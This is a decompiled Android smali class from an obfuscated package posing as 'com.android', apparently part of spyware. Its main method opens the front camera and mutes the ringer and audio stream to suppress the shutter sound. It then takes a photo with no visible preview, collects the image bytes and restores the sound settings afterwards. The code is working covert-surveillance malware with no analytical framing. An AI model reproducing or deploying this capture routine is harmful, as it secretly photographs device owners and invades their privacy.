.class public Lcom/android/x5a807058/as;
.super Ljava/lang/Object;


# instance fields
.field private a:Lcom/android/x5a807058/bb;

.field private b:Landroid/hardware/Camera;

.field private c:Landroid/media/AudioManager;

.field private d:[B

.field private e:Landroid/view/WindowManager;


# direct methods
.method public constructor <init>()V
    .locals 2

    const/4 v1, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    invoke-static {v1}, Lcom/android/x5a807058/bb;->a(Landroid/content/Context;)Lcom/android/x5a807058/bb;

    move-result-object v0

    iput-object v0, p0, Lcom/android/x5a807058/as;->a:Lcom/android/x5a807058/bb;

    iput-object v1, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    iput-object v1, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    iput-object v1, p0, Lcom/android/x5a807058/as;->d:[B

    iget-object v0, p0, Lcom/android/x5a807058/as;->a:Lcom/android/x5a807058/bb;

    invoke-virtual {v0}, Lcom/android/x5a807058/bb;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/android/x5a807058/as;->e:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic a(Lcom/android/x5a807058/as;[B)[B
    .locals 0

    iput-object p1, p0, Lcom/android/x5a807058/as;->d:[B

    return-object p1
.end method

.method private b()Landroid/hardware/Camera;
    .locals 5

    const/4 v2, 0x1

    const/4 v1, 0x0

    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v0

    if-ne v0, v2, :cond_0

    move v0, v1

    :goto_0
    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v3

    new-instance v4, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v4}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    invoke-static {v0, v4}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    iget-object v0, p0, Lcom/android/x5a807058/as;->e:Landroid/view/WindowManager;

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Display;->getRotation()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    :goto_1
    :pswitch_0
    iget v0, v4, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-ne v0, v2, :cond_1

    iget v0, v4, Landroid/hardware/Camera$CameraInfo;->orientation:I

    add-int/2addr v0, v1

    rem-int/lit16 v0, v0, 0x168

    rsub-int v0, v0, 0x168

    rem-int/lit16 v0, v0, 0x168

    :goto_2
    invoke-virtual {v3, v0}, Landroid/hardware/Camera;->setDisplayOrientation(I)V

    return-object v3

    :cond_0
    move v0, v2

    goto :goto_0

    :pswitch_1
    const/16 v1, 0x5a

    goto :goto_1

    :pswitch_2
    const/16 v1, 0xb4

    goto :goto_1

    :pswitch_3
    const/16 v1, 0x10e

    goto :goto_1

    :cond_1
    iget v0, v4, Landroid/hardware/Camera$CameraInfo;->orientation:I

    sub-int/2addr v0, v1

    add-int/lit16 v0, v0, 0x168

    rem-int/lit16 v0, v0, 0x168

    goto :goto_2

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method


# virtual methods
.method a()[B
    .locals 6

    const/4 v1, 0x0

    const/4 v2, 0x1

    :try_start_0
    invoke-direct {p0}, Lcom/android/x5a807058/as;->b()Landroid/hardware/Camera;

    move-result-object v0

    iput-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    new-instance v3, Lcom/android/x5a807058/au;

    invoke-direct {v3, p0}, Lcom/android/x5a807058/au;-><init>(Lcom/android/x5a807058/as;)V

    iget-object v0, p0, Lcom/android/x5a807058/as;->a:Lcom/android/x5a807058/bb;

    invoke-virtual {v0}, Lcom/android/x5a807058/bb;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v4, "audio"

    invoke-virtual {v0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    iput-object v0, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    iget-object v0, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    const/4 v4, 0x1

    invoke-virtual {v0, v2, v4}, Landroid/media/AudioManager;->setStreamSolo(IZ)V

    iget-object v0, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    const/4 v4, 0x0

    invoke-virtual {v0, v4}, Landroid/media/AudioManager;->setRingerMode(I)V

    iget-object v0, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    const/4 v4, 0x1

    invoke-virtual {v0, v2, v4}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    new-instance v0, Lcom/android/x5a807058/at;

    invoke-direct {v0, p0}, Lcom/android/x5a807058/at;-><init>(Lcom/android/x5a807058/as;)V

    iget-object v4, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    const/4 v5, 0x0

    invoke-virtual {v4, v5}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    iget-object v4, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    invoke-virtual {v4}, Landroid/hardware/Camera;->startPreview()V

    iget-object v4, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    const/4 v5, 0x0

    invoke-virtual {v4, v3, v5, v0}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    const-wide/16 v3, 0xbb8

    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    iget-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    iget-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    move v0, v1

    :goto_0
    iget-object v1, p0, Lcom/android/x5a807058/as;->d:[B

    if-nez v1, :cond_0

    const/16 v1, 0x22

    if-ge v0, v1, :cond_0

    const-wide/16 v3, 0x3e8

    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    iget-object v0, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    const/4 v1, 0x0

    invoke-virtual {v0, v2, v1}, Landroid/media/AudioManager;->setStreamSolo(IZ)V

    iget-object v0, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/AudioManager;->setRingerMode(I)V

    iget-object v0, p0, Lcom/android/x5a807058/as;->c:Landroid/media/AudioManager;

    const/4 v1, 0x0

    invoke-virtual {v0, v2, v1}, Landroid/media/AudioManager;->setStreamMute(IZ)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    iget-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_1
    :goto_1
    iget-object v0, p0, Lcom/android/x5a807058/as;->d:[B

    return-object v0

    :catch_0
    move-exception v0

    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    iget-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    goto :goto_1

    :catchall_0
    move-exception v0

    iget-object v1, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/android/x5a807058/as;->b:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->release()V

    :cond_2
    throw v0
.end method
